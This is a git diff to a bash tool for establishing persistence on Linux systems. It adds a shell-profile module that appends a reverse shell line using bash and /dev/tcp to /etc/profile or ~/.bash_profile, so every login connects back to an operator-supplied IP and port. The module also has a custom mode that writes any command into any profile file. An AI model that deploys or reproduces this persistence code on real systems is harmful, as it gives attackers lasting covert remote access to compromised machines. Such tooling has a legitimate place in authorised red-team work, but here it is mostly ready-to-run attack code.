@@ -40,7 +40,6 @@ usage_user() {
     echo "    --default                    Use default cron settings"
     echo "        --ip <ip>                  Specify IP address"
     echo "        --port <port>              Specify port number"
-    echo "  --shell-configuration       Shell configuration persistence"
     echo "  --ssh-key                   SSH key persistence"
     echo "  --systemd                   Systemd service persistence"
     echo "      --default                    Use default systemd settings"
@@ -58,6 +57,13 @@ usage_user() {
     echo "      --custom                     Use custom at settings"
     echo "          --command <command>          Specify custom persistence command"
     echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
+    echo "  --shell-configuration         Shell profile persistence"
+    echo "      --default                    Use default profile settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom profile settings"
+    echo "          --file <file>                Specify custom profile file"
+    echo "          --command <command>          Specify custom persistence command"
 }
 
 # Function to show the usage menu for root users
@@ -77,8 +83,6 @@ usage_root() {
     echo "          --weekly                    Persist in cron.weekly directory"
     echo "          --name <name>               Specify custom cron job name"
     echo "          --crontab                   Persist in crontab file"
-
-    echo "  --shell-configuration       Shell configuration persistence"
     echo "  --ssh-key                   SSH key persistence"
     echo "  --systemd                   Systemd service persistence"
     echo "      --default                    Use default systemd settings"
@@ -96,6 +100,13 @@ usage_root() {
     echo "      --custom                     Use custom at settings"
     echo "          --command <command>          Specify custom persistence command"
     echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
+    echo "  --shell-configuration         Shell profile persistence"
+    echo "      --default                    Use default profile settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom profile settings"
+    echo "          --file <file>                Specify custom profile file"
+    echo "          --command <command>          Specify custom persistence command"
 }
 
 # Function for systemd setup
@@ -489,16 +500,87 @@ setup_at() {
     echo "[+] At job persistence established."
 }
 
-# Function for generating SSH key
-generate_ssh_key() {
-    echo "Generating SSH key..."
-    # Add your SSH key generation code here
+# Function for shell configuration
+setup_shell_profile() {
+    local profile_path=""
+    local command=""
+    local custom=0
+    local default=0
+    local ip=""
+    local port=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --custom )
+                custom=1
+                ;;
+            --file )
+                shift
+                profile_path=$1
+                ;;
+            --command )
+                shift
+                command=$1
+                ;;
+            --ip )
+                shift
+                ip=$1
+                ;;
+            --port )
+                shift
+                port=$1
+                ;;
+            * )
+                echo "Invalid option for --profile: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 1 && $custom -eq 1 ]]; then
+        echo "Error: --default and --custom cannot be specified together."
+        exit 1
+    elif [[ $default -eq 1 ]]; then
+        if [[ -z $ip || -z $port ]]; then
+            echo "Error: --ip and --port must be specified when using --default."
+            exit 1
+        fi
+
+        if check_root; then
+            profile_path="/etc/profile"
+        else
+            local current_user=$(whoami)
+            profile_path="/home/$current_user/.bash_profile"
+        fi
+
+        echo "(nohup bash -i > /dev/tcp/$ip/$port 0<&1 2>&1 &)" >> $profile_path
+    elif [[ $custom -eq 1 ]]; then
+        if [[ -z $profile_path || -z $command ]]; then
+            echo "Error: --file and --command must be specified when using --custom."
+            exit 1
+        fi
+
+        echo "$command" >> $profile_path
+    else
+        echo "Error: Either --default or --custom must be specified for --profile."
+        exit 1
+    fi
+
+    echo "[+] Shell profile persistence established."
 }
 
-# Function for shell configuration
-configure_shell() {
-    echo "Configuring shell..."
-    # Add your shell configuration code here
+setup_xdg() {
+    echo "Generating XDG persistence..."
+    # Add your XDG persistence code here  
+}
+
+# Function for generating SSH key
+setup_ssh_key() {
+    echo "Generating SSH key..."
+    # Add your SSH key generation code here
 }
 
 # Main function
@@ -561,11 +643,12 @@ main() {
                 exit
                 ;;
             --ssh-key )
-                generate_ssh_key
+                setup_ssh_key
                 exit
                 ;;
             --shell-configuration )
-                configure_shell
+                shift
+                setup_shell_profile "$@"
                 exit
                 ;;
             * )
